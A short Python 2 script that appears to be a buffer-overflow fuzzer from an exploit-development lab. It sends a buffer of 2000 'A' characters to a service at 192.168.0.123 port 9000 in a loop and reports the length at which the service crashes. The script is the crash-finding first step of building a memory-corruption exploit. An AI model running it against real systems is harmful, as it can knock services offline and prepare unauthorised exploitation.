import sys, socket
from time import sleep

buffer ="A" * 2000

while True: 
        try: 
             s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect(('192.168.0.123',9000))
             print "Trying with buffer length %d" % len(buffer)
             s.send((buffer ))
             s.recv(1024)
             s.close()
             
             #buffer=buffer + "A"*100


        except: 
                print("Fuzzing Crashed at %s by" % str(len(buffer)))
                sys.exit()     